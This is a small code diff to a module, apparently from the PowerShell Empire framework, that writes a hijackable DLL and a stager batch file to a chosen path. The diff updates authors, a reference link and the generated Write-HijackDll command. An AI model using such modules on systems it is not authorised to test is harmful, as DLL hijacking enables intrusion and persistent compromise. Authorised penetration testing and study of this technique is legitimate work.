@@ -7,7 +7,7 @@ class Module:
         self.info = {
             'Name': 'Write-DllHijacker',
 
-            'Author': ['@harmj0y'],
+            'Author': ['leechristensen (@tifkin_)', '@harmj0y'],
 
             'Description': ("Writes out a hijackable .dll to the specified path "
                             "along with a stager.bat that's called by the .dll. "
@@ -25,7 +25,7 @@ class Module:
             'MinPSVersion' : '2',
             
             'Comments': [
-                'https://github.com/Veil-Framework/PowerTools/tree/master/PowerUp'
+                'https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp'
             ]
         }
 
@@ -122,6 +122,6 @@ class Module:
             print helpers.color("[!] Error in launcher .bat generation.")
             return ""
         else:
-            script += "Write-HijackDll -HijackPath '"+hijackPath+"';"
-
+            # script += "Write-HijackDll -HijackPath '"+hijackPath+"';"
+            script += "Write-HijackDll -OutputFile '"+str(hijackPath)+"' -BatPath '"+str(batPath)+"';"
             return script
